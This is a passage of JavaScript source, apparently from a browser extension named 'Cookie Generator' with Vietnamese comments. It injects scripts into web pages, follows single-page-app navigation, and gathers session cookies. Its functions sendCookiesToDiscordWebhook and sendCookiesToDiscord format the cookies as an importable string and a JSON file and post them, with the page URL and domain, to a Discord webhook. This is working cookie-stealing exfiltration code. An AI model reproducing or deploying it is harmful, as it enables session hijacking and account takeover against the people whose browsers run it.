              extractCookies();
            }, 500);
          }
          
          // Trả về phản hồi gốc
          return response;
        })
        .catch(error => {
          console.warn(`Cookie Generator: Lỗi trong yêu cầu fetch đến: ${url}`, error);
          
          // Trả về lỗi gốc
          throw error;
        });
    };
    
    console.log('Cookie Generator: Đã thiết lập xử lý AJAX cho SPA thành công');
    return true;
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi thiết lập xử lý AJAX', error);
    return false;
  }
}

/**
 * Xử lý URL tương đối trong SPA
 */
function handleRelativeURLs() {
  console.log('Cookie Generator: Thiết lập xử lý URL tương đối');
  
  try {
    // Thêm xử lý cho các thẻ <base>
    const existingBaseTag = document.querySelector('base');
    const currentBase = existingBaseTag ? existingBaseTag.getAttribute('href') : '/';
    
    console.log(`Cookie Generator: Base URL hiện tại là: ${currentBase}`);
    
    // Theo dõi các thẻ base mới
    const observeBaseChanges = new MutationObserver((mutations) => {
      mutations.forEach(mutation => {
        if (mutation.type === 'childList') {
          mutation.addedNodes.forEach(node => {
            if (node.tagName === 'BASE') {
              console.log(`Cookie Generator: Phát hiện thẻ BASE mới với href="${node.getAttribute('href')}"`);
              
              // Xử lý lại tất cả URL sau khi base thay đổi
              processSafeLinks();
            }
          });
        } else if (mutation.type === 'attributes' && 
                   mutation.target.tagName === 'BASE' && 
                   mutation.attributeName === 'href') {
          console.log(`Cookie Generator: Thẻ BASE thay đổi href thành "${mutation.target.getAttribute('href')}"`);
          
          // Xử lý lại tất cả URL sau khi base thay đổi
          processSafeLinks();
        }
      });
    });
    
    // Theo dõi thẻ head để phát hiện thay đổi thẻ base
    observeBaseChanges.observe(document.head, {
      childList: true,
      attributes: true,
      attributeFilter: ['href'],
      subtree: true
    });
    
    // Xử lý đặc biệt cho các SPA sử dụng router tùy chỉnh
    const customRouterHandler = `
      (function() {
        // Theo dõi các thư viện router phổ biến
        const routerLibraries = [
          'react-router', 'vue-router', 'angular-router', 'svelte-router',
          'navigo', 'vaadin-router', 'page.js', 'framework7-router'
        ];
        
        // Kiểm tra khi trang tải xong
        window.addEventListener('load', function() {
          // Báo cáo về các router được tìm thấy
          routerLibraries.forEach(lib => {
            if (window[lib] || 
                (window.React && window.ReactRouter) || 
                (window.Vue && window.VueRouter) || 
                (window.ng && window.ng.router)) {
              console.log('Cookie Generator: Phát hiện router SPA:', lib);
              
              // Thông báo phát hiện router
              window.postMessage({
                from: 'cookiegen_page',
                action: 'router_detected',
                router: lib
              }, '*');
            }
          });
        });
        
        // Lắng nghe các sự kiện điều hướng tùy chỉnh
        const customEvents = [
          'routeChangeStart', 'routeChangeComplete', 'navigationStart', 'navigationEnd',
          'route-changed', 'router:navigation', 'page:start', 'page:finish'
        ];
        
        customEvents.forEach(event => {
          window.addEventListener(event, function() {
            console.log('Cookie Generator: Phát hiện sự kiện điều hướng SPA:', event);
            
            // Thông báo sự kiện điều hướng
            window.postMessage({
              from: 'cookiegen_page',
              action: 'route_changed',
              event: event
            }, '*');
          });
        });
      })();
    `;
    
    // Chèn script vào trang
    const scriptElement = document.createElement('script');
    scriptElement.textContent = customRouterHandler;
    document.head.appendChild(scriptElement);
    setTimeout(() => scriptElement.remove(), 100);
    
    // Lắng nghe thông báo từ script
    window.addEventListener('message', function(event) {
      if (event.source !== window) return;
      const message = event.data;
      
      if (message && message.from === 'cookiegen_page') {
        if (message.action === 'router_detected') {
          console.log(`Cookie Generator: Đã phát hiện router SPA: ${message.router}`);
        } else if (message.action === 'route_changed') {
          console.log(`Cookie Generator: Phát hiện thay đổi route SPA: ${message.event}`);
          
          // Xử lý sau khi route thay đổi
          setTimeout(() => {
            console.log('Cookie Generator: Xử lý lại trang sau khi route thay đổi');
            handleURLChange();
          }, 500);
        }
      }
    });
    
    console.log('Cookie Generator: Đã thiết lập xử lý URL tương đối thành công');
    return true;
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi xử lý URL tương đối', error);
    return false;
  }
}

/**
 * Gửi cookies đến Discord webhook
 * @param {Array} cookies Danh sách cookies cần gửi
 * @param {string} webhookUrl URL của Discord webhook
 * @return {Promise<boolean>} Kết quả
 */
async function sendCookiesToDiscordWebhook(cookies, webhookUrl) {
  try {
    if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
      console.error('Cookie Generator: Không có cookies để gửi');
      return false;
    }

    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      console.error('Cookie Generator: URL webhook không hợp lệ');
      return false;
    }

    console.log(`Cookie Generator: Gửi ${cookies.length} cookies đến Discord webhook`);
    
    // Chuẩn bị dữ liệu
    const domain = window.location.hostname;
    const url = window.location.href;
    const timestamp = new Date().toISOString();
    
    // Format cookies thành chuỗi để dễ sử dụng
    let cookieString = '';
    const formattedCookies = cookies.map(cookie => {
      cookieString += `${cookie.name}=${cookie.value}; `;
      return `${cookie.name}: ${cookie.value}`;
    }).join('\n');
    
    // Tạo nội dung cho Discord
    const payload = {
      username: "Cookie Generator",
      avatar_url: "https://i.imgur.com/SZ0VJxM.png",
      embeds: [
        {
          title: `Cookies thu thập từ ${domain}`,
          description: "Cookie string (định dạng để import):",
          color: 0x00AAFF,
          fields: [
            {
              name: "Cookie String",
              value: "```\n" + cookieString + "\n```"
            },
            {
              name: "Chi tiết Cookies",
              value: "```\n" + formattedCookies.substring(0, 1000) + (formattedCookies.length > 1000 ? "\n... (đã cắt bớt)" : "") + "\n```"
            },
            {
              name: "URL",
              value: url
            },
            {
              name: "Thời gian",
              value: timestamp
            }
          ],
          footer: {
            text: "Cookie Generator - Nguyen Anh"
          }
        }
      ]
    };
    
    // Nếu danh sách cookies quá dài, tạo thêm file đính kèm
    if (formattedCookies.length > 1500) {
      // Tạo file JSON đầy đủ
      const fullCookiesJson = JSON.stringify(cookies, null, 2);
      const cookieBlob = new Blob([fullCookiesJson], { type: 'application/json' });
      
      // Tạo FormData để gửi file
      const formData = new FormData();
      formData.append('payload_json', JSON.stringify(payload));
      formData.append('file', cookieBlob, `cookies_${domain}_${Date.now()}.json`);
      
      // Gửi request với file đính kèm
      const response = await fetch(webhookUrl, {
        method: 'POST',
        body: formData
      });
      
      if (!response.ok) {
        console.error('Cookie Generator: Lỗi khi gửi đến Discord webhook', await response.text());
        return false;
      }
    } else {
      // Gửi request thông thường nếu cookies không quá dài
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      if (!response.ok) {
        console.error('Cookie Generator: Lỗi khi gửi đến Discord webhook', await response.text());
        return false;
      }
    }
    
    console.log('Cookie Generator: Đã gửi cookies thành công đến Discord webhook');
    return true;
  } catch (error) {
    console.error('Cookie Generator: Lỗi khi gửi cookies đến Discord webhook', error);
    return false;
  }
}

/**
 * Dịch vụ xuất cookies ra file hoặc webhook
 */
const CookieExportService = {
  // Lưu trữ webhook URL
  webhookUrl: '',
  
  // Thiết lập webhook URL
  setWebhookUrl: function(url) {
    if (!url || typeof url !== 'string') return false;
    
    // Lưu webhook URL vào localStorage
    try {
      this.webhookUrl = url;
      localStorage.setItem('cookiegen_webhook_url', url);
      console.log('Cookie Generator: Đã lưu webhook URL');
      return true;
    } catch (error) {
      console.error('Cookie Generator: Lỗi khi lưu webhook URL', error);
      return false;
    }
  },
  
  // Lấy webhook URL từ localStorage
  getWebhookUrl: function() {
    try {
      const savedUrl = localStorage.getItem('cookiegen_webhook_url');
      if (savedUrl) {
        this.webhookUrl = savedUrl;
        return savedUrl;
      }
      return this.webhookUrl;
    } catch (error) {
      console.error('Cookie Generator: Lỗi khi lấy webhook URL', error);
      return this.webhookUrl;
    }
  },
  
  // Xuất cookies ra Discord webhook
  exportToDiscord: async function(cookies) {
    const webhookUrl = this.getWebhookUrl();
    if (!webhookUrl) {
      console.error('Cookie Generator: Không có webhook URL');
      return false;
    }
    
    return await sendCookiesToDiscordWebhook(cookies, webhookUrl);
  },
  
  // Xuất cookies ra file
  exportToFile: function(cookies, filename = null) {
    try {
      if (!cookies || !Array.isArray(cookies) || cookies.length === 0) {
        console.error('Cookie Generator: Không có cookies để xuất');
        return false;
      }
      
      // Chuẩn bị dữ liệu
      const domain = window.location.hostname;
      const timestamp = Date.now();
      const defaultFilename = `cookies_${domain}_${timestamp}.json`;
      const actualFilename = filename || defaultFilename;
      
      // Tạo nội dung file
      const jsonContent = JSON.stringify(cookies, null, 2);
      const blob = new Blob([jsonContent], { type: 'application/json' });
      
      // Tạo URL cho blob
      const url = URL.createObjectURL(blob);
      
      // Tạo link để tải xuống
      const downloadLink = document.createElement('a');
      downloadLink.href = url;
      downloadLink.download = actualFilename;
      
      // Thêm vào DOM và click để tải xuống
      document.body.appendChild(downloadLink);
      downloadLink.click();
      
      // Dọn dẹp
      document.body.removeChild(downloadLink);
      setTimeout(() => URL.revokeObjectURL(url), 100);
      
      console.log(`Cookie Generator: Đã xuất cookies ra file ${actualFilename}`);
      return true;
    } catch (error) {
      console.error('Cookie Generator: Lỗi khi xuất cookies ra file', error);
      return false;
    }
  },
  
  setAutoExport: function(enabled) {
    this.autoExport = enabled;
    console.log("CookieExportService: Tự động xuất cookie:", enabled);
  },
  
  async sendCookiesToDiscord(cookies, url, webhookUrl) {
    return sendCookiesToDiscord(cookies, url, webhookUrl || this.webhookUrl);
  }
};

// Hàm gửi cookies đến Discord webhook
async function sendCookiesToDiscord(cookies, url, webhookUrl) {
  try {
    console.log('Đang chuẩn bị gửi cookies đến Discord...', {
      cookies_type: typeof cookies,
      cookies_value: cookies,
      has_cookies: !!cookies,
      count: cookies ? (Array.isArray(cookies) ? cookies.length : Object.keys(cookies).length) : 0,
      url: url,
      webhook_url: webhookUrl
    });

    if (!webhookUrl) {
      throw new Error('Không có Discord webhook URL');
    }
    
    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      throw new Error('Discord webhook URL không hợp lệ');
    }
    
    // Kiểm tra cookies hợp lệ
    if (!cookies) {
      throw new Error('Không có cookies để gửi');
    }

    // Chuyển đổi cookies sang định dạng đúng nếu cần
    let cookiesObject = cookies;
    if (Array.isArray(cookies)) {
      // Chuyển đổi mảng cookies thành object
      cookiesObject = {};
      for (const cookie of cookies) {
        if (cookie && cookie.name) {
          cookiesObject[cookie.name] = cookie.value || '';
        }
      }
    } else if (typeof cookies !== 'object') {
      throw new Error('Định dạng cookies không hợp lệ');
    }
    
    // Lấy thông tin trang web
    const domain = extractMainDomain(new URL(url).hostname);
    const pageTitle = document.title || domain;
    const timestamp = new Date().toLocaleString('vi-VN');
    
    // Đếm số lượng cookies
    const cookieCount = Object.keys(cookiesObject).length;
    
    if (cookieCount === 0) {
      throw new Error('Không tìm thấy cookies hợp lệ để gửi');
    }
    
    console.log(`Tìm thấy ${cookieCount} cookies cho domain ${domain}`);
    
    // Tạo nội dung cho webhook
    const data = {
      username: "Cookie Generator",
      avatar_url: "https://i.imgur.com/SZ0VJxM.png",
      embeds: [{
        title: `Cookies từ ${domain}`,
        description: `Đã trích xuất ${cookieCount} cookies từ ${pageTitle}`,
        color: 3447003,
        fields: [
          {
            name: "URL",
            value: url.substring(0, 1000), // Discord giới hạn 1024 ký tự
            inline: false
          },
          {
            name: "Thời gian",
            value: timestamp,
            inline: true
          },
          {
            name: "Số lượng cookies",
            value: cookieCount.toString(),
            inline: true
          }
        ],
        timestamp: new Date().toISOString()
      }]
    };
    
    // Tạo file JSON chứa cookies
    const jsonData = {
      domain: domain,
      url: url,
      timestamp: Date.now(),
      title: pageTitle,
      cookies: cookiesObject
    };
    
    const jsonContent = JSON.stringify(jsonData, null, 2);
    const jsonBlob = new Blob([jsonContent], { type: 'application/json' });
    const jsonFile = new File([jsonBlob], `cookies_${domain}_${Date.now()}.json`, { type: 'application/json' });
    
    // Tạo FormData để gửi file JSON
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify(data));
    formData.append('file', jsonFile);
    
    // Gửi dữ liệu đến webhook
    console.log('Gửi dữ liệu JSON đến Discord webhook:', domain);
    
    const response = await fetch(webhookUrl, {
      method: 'POST',
      body: formData
    });
    
    if (!response.ok) {
      throw new Error(`Lỗi HTTP: ${response.status} - ${await response.text()}`);
    }
    
    console.log('Đã gửi cookies thành công đến Discord ở định dạng JSON');
    return { success: true, message: 'Đã gửi cookies thành công' };
  } catch (error) {
    console.error('Lỗi khi xử lý việc gửi cookies:', error);
    throw error;
  }
}